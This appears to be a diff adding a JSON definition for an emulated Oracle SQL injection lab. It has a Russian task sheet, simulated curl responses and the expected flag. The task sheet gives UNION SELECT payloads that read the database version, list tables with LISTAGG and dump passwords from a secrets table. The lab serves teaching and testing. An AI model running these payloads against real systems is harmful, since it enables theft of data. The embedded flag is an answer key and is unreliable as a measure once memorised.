@@ -1,0 +1,52 @@
+{
+  "id": "db-oracle",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{0r4cl3_l1st4gg_dumps_th3_t4bl3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Oracle-инъекция на erp.example\n\nЦель — `http://erp.example/report?id=1` (Java + Oracle).\n\n1. Диалект: `curl -s \"http://erp.example/report?id=1'\"` → `ORA-01756`.\n2. Версия: `... UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -`.\n3. Таблицы: `... UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM user_tables-- -`.\n4. Флаг: `... LISTAGG(password,CHR(10)) ... FROM secrets-- -`.\n5. `... | grep 'nto' > found.txt`, затем `check`.\nПомни: `LIMIT` в Oracle нет, `#` не комментирует.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция erp.example/report)",
+      "cases": [
+        {
+          "match": "v\\$version",
+          "example": "-s '... SELECT banner FROM v$version WHERE rownum=1 ...'",
+          "output": "[[1,\"Oracle Database 19c Enterprise Edition Release 19.0.0.0.0\",3]]\n"
+        },
+        {
+          "match": "user_tables",
+          "example": "-s '... LISTAGG(table_name, chr(44)) ... FROM user_tables-- -'",
+          "output": "[[1,\"ORDERS,PRODUCTS,SECRETS\",3]]\n"
+        },
+        {
+          "match": "from secrets",
+          "example": "-s '... LISTAGG(password,CHR(10)) ... FROM secrets-- -'",
+          "output": "[[1,\"nto{0r4cl3_l1st4gg_dumps_th3_t4bl3}\",3]]\n"
+        },
+        {
+          "match": "report\\?id=1'",
+          "example": "-s \"http://erp.example/report?id=1'\"",
+          "output": "ORA-01756: quoted string not properly terminated\n"
+        },
+        {
+          "match": "report\\?id=1\\b",
+          "example": "-s 'http://erp.example/report?id=1'",
+          "output": "[[1,\"Q1\",3]]\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://erp.example/report.\n"
+    }
+  }
+}
